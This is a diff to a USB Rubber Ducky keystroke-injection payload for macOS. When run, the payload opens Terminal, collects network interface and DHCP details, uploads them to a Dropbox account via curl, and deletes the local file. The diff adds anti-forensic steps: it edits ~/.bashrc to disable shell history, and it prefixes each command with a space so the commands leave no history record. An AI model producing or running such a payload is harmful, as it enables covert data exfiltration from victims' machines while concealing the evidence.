@@ -18,18 +18,22 @@ STRING terminal
 DELAY 1000
 ENTER
 DELAY 500
-STRING osascript -e 'do shell script "networksetup -listallhardwareports > \"$HOME/Desktop/network_interfaces.txt\" && ipconfig getpacket en0 >> \"$HOME/Desktop/network_interfaces.txt\""'
+STRING echo -e "export HISTCONTROL=ignorespace\nunset HISTFILE" >> ~/.bashrc && source ~/.bashrc && exec bash
+DELAY 500
+ENTER
+DELAY 500
+STRING  osascript -e 'do shell script "networksetup -listallhardwareports > \"$HOME/Desktop/network_interfaces.txt\" && ipconfig getpacket en0 >> \"$HOME/Desktop/network_interfaces.txt\""'
 DELAY 1000
 ENTER
 DELAY 500
-STRING curl -X POST https://content.dropboxapi.com/2/files/upload -H "Authorization: Bearer <API access token here>" -H "Dropbox-API-Arg: {\"path\": \"/Backup/network_interfaces.txt\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" -H "Content-Type: application/octet-stream" --data-binary @"$HOME/Desktop/network_interfaces.txt"
+STRING  curl -X POST https://content.dropboxapi.com/2/files/upload -H "Authorization: Bearer <API access token here>" -H "Dropbox-API-Arg: {\"path\": \"/Backup/network_interfaces.txt\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" -H "Content-Type: application/octet-stream" --data-binary @"$HOME/Desktop/network_interfaces.txt"
 DELAY 2000
 ENTER
 DELAY 5000
-STRING rm -r ~/Desktop/network_interfaces.txt
+STRING  rm -r ~/Desktop/network_interfaces.txt
 DELAY 500
 ENTER
-STRING clear
+STRING  clear
 DELAY 500
 ENTER
 GUI w
